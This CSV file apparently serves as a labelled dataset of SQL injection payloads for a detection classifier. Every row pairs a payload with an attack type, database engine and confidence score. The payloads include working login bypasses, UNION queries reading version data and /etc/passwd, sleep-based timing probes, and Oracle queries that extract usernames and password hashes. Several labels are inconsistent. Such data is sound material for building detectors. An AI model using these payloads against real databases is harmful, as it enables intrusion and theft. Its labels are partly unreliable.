id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
82,"""a"""" or 1 = 1--""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 16 chars.,2
83,"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 94 chars.,2
85,"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
88,"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
89,"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
94,or 1 = 1 or '' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
98,"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
99,admin' or '1' = '1'#,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 20 chars.,2
105,"select * from users where id = '1' union select !<@,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
108,"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
111, or 3 = 3 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2
112,"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 95 chars.,2
113,"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
115,"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
117,"select * from users where id = 1 union select .1_,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
124,"select * from users where id = 1 <1## union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
125,"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
132,admin' #,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 8 chars.,2
133,"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
138,"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
142,or 3 = 3,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 8 chars.,2
145,"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
147,"select * from users where id = 1.&&1 union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
148,admin' or 1 = 1/*,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 17 chars.,2
150,"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
151,"select * from users where id = 1 union select .1$_,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
157,"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
164,"select * from users where id = 1<@.. union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
165,"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
169,1 and 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2
170,or 0 = 0 #,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
172,"select * from users where id = 1 union select 1||@,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
176,"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
178,"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 98 chars.,2
183,"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
186,"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
187,"select * from users where id = 1 union select 1<@$,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
188,"select * from users where id = 1 *\ union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
189,"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
193,||UTL_HTTP.REQUEST,out_of_band,generic,0.7,. Payload length: 18 chars.,2
195,"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
197,"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
198,"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
18,distinct,benign,generic,0.5,. Payload length: 8 chars.,2
52,PRINT,benign,generic,0.5,. Payload length: 5 chars.,2
128,; execute immediate 'sel' || 'ect us' || 'er',benign,generic,0.5,. Payload length: 45 chars.,2
0,""" or pg_sleep ( __TIME__ ) --",time_blind,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; Time-blind SQLi (sleep/delay function); DB: postgresql",1
55,1 or pg_sleep ( __TIME__ ) --,time_blind,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; Time-blind SQLi (sleep/delay function); DB: postgresql",1
104,1 ) ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; Time-blind SQLi (sleep/delay function); DB: postgresql",1
140,) ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; Time-blind SQLi (sleep/delay function); DB: postgresql",1
159,1 ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; Time-blind SQLi (sleep/delay function); DB: postgresql",1
116,"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
122,1 ) or sleep ( __TIME__ ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
134,"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",union_based,mysql,0.9,Signals: 'load_file'; UNION-based payload detected; DB: mysql,1
139,or username like char ( 37 ) ;,boolean_blind,mssql,0.9,Signals: 'char'; Boolean-blind SQLi (OR/AND logic); DB: mssql,1
161,""" ) or sleep ( __TIME__ ) = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
179,"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
196,""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
10,) or ( 'a' = 'a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
48,or 1 --',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 8 chars.,1
58,or 2 between 1 and 3,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,1
74,) or ( 'x' = 'x,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
86,1 and user_name ( ) = 'dbo',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,1
96,or 'text' > 't',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
109,or 'unusual' = 'unusual',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,1
127,or true--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1
129,hi' or 'x' = 'x';,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 17 chars.,1
153,hi' ) or ( 'a' = 'a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,1
156,""" ) or true--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,1
180,or '' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1
185,""" or """"^""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,1
20,"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116",union_based,generic,1.0,"Signals: 'substring', 'substr', 'ascii'; UNION-based payload detected",0
62,; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,union_based,mssql,1.0,"Signals: 'waitfor', 'if'; UNION-based payload detected; DB: mssql",0
87,"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --",union_based,mssql,1.0,"Signals: 'waitfor', 'substring', 'substr'; UNION-based payload detected; DB: mssql",0
121,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --",union_based,mssql,1.0,"Signals: 'waitfor', 'substring', 'substr'; UNION-based payload detected; DB: mssql",0
2,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
14,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
27,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
76,$ ( sleep 50 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,0
84,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
93,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
101,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
102,select * from information_schema.tables--,union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,0
118,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
154,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
181,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
182,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
194,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
5,select * from users where id = 1 +$+ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,0
12,"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
16,"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
17,"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
19,select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,0
21,select * from users where id = 1 or \.<\ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
22,"admin"" or ""1"" = ""1""--",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 21 chars.,0
23,"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
25,"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,0
26,"select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
28,"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
31,"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
40,select * from users where id = 1 or \.<1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
44,select * from users where id = '1' or \.<\ or 1 = 1 -- 1',union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,0
45,"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
46,"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
47,"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
49,"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
50,"admin"" or 1 = 1#",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 16 chars.,0
56,"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
57,admin' ) or ( '1' = '1'/*,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 25 chars.,0
59,"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,0
66,select * from users where id = 1 <@.$ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
67,"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
69,"select * from users where id = 1 or "",."" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
70,"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
71,admin' ) or ( '1' = '1,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 22 chars.,0
73,"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
81,"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
90,select * from users where id = '1' *$ . or 1 = 1 -- 1',union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
91,select * from users where id = 1 +$+. or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
92,select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,0
95,select * from users where id = 1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,0
97,"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
100,select * from users where id = 1 +$ 1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
103,"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
106,select * from users where id = 1 %!<1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
107,"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
110,or 1 in ( select @@version ) --,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,0
114,"admin"" ) or ( ""1"" = ""1",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 22 chars.,0
119,select * from users where id = 1 %$ 1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
120,select * from users where id = 1 %!<@ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,0
123,"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
126,select * from users where id = 1. <@ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,0
130,select * from users where id = 1 <@ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,0
131,"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
136,"admin"" or ""1"" = ""1""/*",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 21 chars.,0
137,"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,0
141,select * from users where id = 1 or $+<\ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
143,"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
144,select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,0
146,select * from users where id = 1 or \<$ or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,0
152,and 1 in ( select var from temp ) --,union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,0
155,"admin"" or 1 = 1",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 15 chars.,0
158,"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
160,"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
162,select * from users where id = 1.<@. or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,0
163,"admin"" ) or ( ""1"" = ""1""--",auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 25 chars.,0
166,select * from users where id = 1 + \+%1 or 1 = 1 -- 1,union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,0
167,"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
168,"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,0
